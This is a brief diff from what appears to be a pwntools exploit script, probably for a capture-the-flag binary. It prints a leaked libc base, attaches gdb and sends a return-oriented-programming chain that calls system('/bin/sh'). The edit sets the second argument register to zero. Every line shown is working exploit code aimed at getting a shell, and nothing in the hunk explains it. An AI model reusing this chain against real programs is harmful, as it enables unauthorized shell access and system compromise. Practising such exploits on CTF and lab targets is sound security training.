@@ -58,7 +58,7 @@ pop_rsi_r15 = p64(0x4005c1)
 
 print(f"LIBC BASE :: {base_libc}\nSYSTEM :: {system}\n/bin/sh :: {sh}")
 gdb.attach(p)
-exploit2 = junk + pop_rdi_ret + p64(sh) + pop_rsi_r15 + p64(sh) + p64(0) + p64(system)
+exploit2 = junk + pop_rdi_ret + p64(sh) + pop_rsi_r15 + p64(0) + p64(0) + p64(system)
 
 
 p.sendline(exploit2)
